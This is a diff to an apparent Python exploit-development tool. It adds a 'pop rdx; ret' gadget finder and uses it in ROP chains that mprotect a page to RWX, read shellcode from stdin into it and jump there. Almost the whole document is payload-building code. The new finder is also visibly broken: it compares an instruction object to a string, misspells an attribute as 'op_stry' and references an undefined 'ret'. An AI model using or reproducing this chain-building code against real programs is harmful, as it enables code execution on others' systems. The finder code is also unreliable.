@@ -396,6 +396,22 @@ def find_add_rax_1_ret():
     debug(f"no suitable {Colors.BOLD}{Colors.CYAN}add  rax, 1; ret;{Colors.GREY} gadget found!{Colors.RESET}")
     return None
 
+# `pop rdx; ret;`
+def find_pop_rdx_ret():
+    global gadget_map
+    for g_addr in gadget_map:
+        md = Cs(CS_ARCH_X86, CS_MODE_64)
+        md.detail = False
+        g = gadget_map[g_addr]
+        instr_list = list(md.disasm(g, g_addr))
+
+        if len(instr_list) == 2:
+            if instr_list[0] == "pop" and instr_list[0].op_stry == "rdx" and instr_list[1].mnemonic == ret:
+                debug(f"found suitable {Colors.BOLD}{Colors.CYAN}pop rdx; ret;{Colors.GREY} gadget @ {Colors.YELLOW}{hex(g_addr)}{Colors.GREY}{Colors.RESET}")
+                return g_addr
+    debug(f"no suitable {Colors.BOLD}{Colors.CYAN}pop rdx; ret;{Colors.GREY} gadget found!{Colors.RESET}")
+    return None
+
 ############################### CHAIN BUILDERS ################################
 
 # Attempts to build the syscall-mprotect chain
@@ -414,7 +430,8 @@ def build_syscall_mprotect(f):
     pop_rax = find_pop_rax_ret() # syscall number, should be 0xa (10) for mprotect
     pop_rdi = find_pop_rdi_ret() # 1st arg
     pop_rsi = find_pop_rsi_ret() # 2nd arg
-    
+    pop_rdx = find_pop_rdx_ret() # 3rd arg
+
     # 3rd arg, need to get 0x7 into rdx by using r12
     pop_r12_pr = find_pop_r12_pr() # r12 = 7
     mov_rdx_r12_ppr = find_mov_rdx_r12_ppr() # rdx = r12
@@ -435,11 +452,15 @@ def build_syscall_mprotect(f):
     payload += p64(sc_addr)            # address we want to make r/w/x
     payload += p64(pop_rsi)            # 2nd arg
     payload += p64(0x1000)             # 4kb (pagesize)
-    payload += p64(pop_r12_pr)         # r12 = 7
-    payload += p64(0x7)                # R|W|X
-    payload += p64(PLACEHOLDER)        # needed because pop_r12_pr has an extra pop in it
-    payload += p64(mov_rdx_r12_ppr)    # rdx = r12 = 7
-    payload += p64(PLACEHOLDER) * 2    # needed because mov_rdx_r12_ppr has 2 extra pops in it
+    if pop_rdx is not None:
+        payload += p64(pop_rdx)
+        payload += p64(0x7)
+    else:
+        payload += p64(pop_r12_pr)         # r12 = 7
+        payload += p64(0x7)                # R|W|X
+        payload += p64(PLACEHOLDER)        # needed because pop_r12_pr has an extra pop in it
+        payload += p64(mov_rdx_r12_ppr)    # rdx = r12 = 7
+        payload += p64(PLACEHOLDER) * 2    # needed because mov_rdx_r12_ppr has 2 extra pops in it
     payload += p64(syscall)            # syscall
 
     # second, we use a read() call to read the shellcode into the buffer
@@ -448,11 +469,15 @@ def build_syscall_mprotect(f):
     payload += p64(0x0)                # fd0 (stdin)
     payload += p64(pop_rsi)            # 2nd arg
     payload += p64(sc_addr)            # address to write into
-    payload += p64(pop_r12_pr)         # r12 = 4kb
-    payload += p64(0x1000)             # 4kb
-    payload += p64(PLACEHOLDER)        # needed for the extra pr in pop_r12_pr
-    payload += p64(mov_rdx_r12_ppr)    # rdx = r12 = 4kb
-    payload += p64(PLACEHOLDER) * 2    # needed for the extra ppr in mov_rdx_r12_ppr
+    if pop_rdx is not None:
+        payload += p64(pop_rdx)
+        payload += p64(0x1000)
+    else:
+        payload += p64(pop_r12_pr)         # r12 = 4kb
+        payload += p64(0x1000)             # 4kb
+        payload += p64(PLACEHOLDER)        # needed for the extra pr in pop_r12_pr
+        payload += p64(mov_rdx_r12_ppr)    # rdx = r12 = 4kb
+        payload += p64(PLACEHOLDER) * 2    # needed for the extra ppr in mov_rdx_r12_ppr
     payload += p64(syscall)            # syscall
 
     # finally, return into the RWX page containing the shellcode
@@ -542,7 +567,8 @@ def build_libc_mprotect(f):
     pop_rax = find_pop_rax_ret() # syscall number, should be 0xa (10) for mprotect
     pop_rdi = find_pop_rdi_ret() # 1st arg
     pop_rsi = find_pop_rsi_ret() # 2nd arg
-    
+    pop_rdx = find_pop_rdx_ret()
+
     # 3rd arg, need to get 0x7 into rdx by using r12
     pop_r12_pr = find_pop_r12_pr() # r12 = 7
     mov_rdx_r12_ppr = find_mov_rdx_r12_ppr() # rdx = r12
@@ -563,11 +589,15 @@ def build_libc_mprotect(f):
     payload += p64(sc_addr)            # address we want to make r/w/x
     payload += p64(pop_rsi)            # 2nd arg
     payload += p64(0x1000)             # 4kb (pagesize)
-    payload += p64(pop_r12_pr)         # r12 = 7
-    payload += p64(0x7)                # R|W|X
-    payload += p64(PLACEHOLDER)        # needed because pop_r12_pr has an extra pop in it
-    payload += p64(mov_rdx_r12_ppr)    # rdx = r12 = 7
-    payload += p64(PLACEHOLDER) * 2    # needed because mov_rdx_r12_ppr has 2 extra pops in it
+    if pop_rdx is not None:
+        payload += p64(pop_rdx)
+        payload += p64(0x7)
+    else:
+        payload += p64(pop_r12_pr)         # r12 = 7
+        payload += p64(0x7)                # R|W|X
+        payload += p64(PLACEHOLDER)        # needed because pop_r12_pr has an extra pop in it
+        payload += p64(mov_rdx_r12_ppr)    # rdx = r12 = 7
+        payload += p64(PLACEHOLDER) * 2    # needed because mov_rdx_r12_ppr has 2 extra pops in it
     payload += p64(mprotect_addr)      # mprotect()
 
     # second, we use a read() call to read the shellcode into the buffer
@@ -576,11 +606,15 @@ def build_libc_mprotect(f):
     payload += p64(0x0)                # fd0 (stdin)
     payload += p64(pop_rsi)            # 2nd arg
     payload += p64(sc_addr)            # address to write into
-    payload += p64(pop_r12_pr)         # r12 = 4kb
-    payload += p64(0x1000)             # 4kb
-    payload += p64(PLACEHOLDER)        # needed for the extra pr in pop_r12_pr
-    payload += p64(mov_rdx_r12_ppr)    # rdx = r12 = 4kb
-    payload += p64(PLACEHOLDER) * 2    # needed for the extra ppr in mov_rdx_r12_ppr
+    if pop_rdx is not None:
+        payload += p64(pop_rdx)
+        payload += p64(0x1000)
+    else:
+        payload += p64(pop_r12_pr)         # r12 = 4kb
+        payload += p64(0x1000)             # 4kb
+        payload += p64(PLACEHOLDER)        # needed for the extra pr in pop_r12_pr
+        payload += p64(mov_rdx_r12_ppr)    # rdx = r12 = 4kb
+        payload += p64(PLACEHOLDER) * 2    # needed for the extra ppr in mov_rdx_r12_ppr
     payload += p64(syscall)            # syscall
 
     # finally, return into the RWX page containing the shellcode
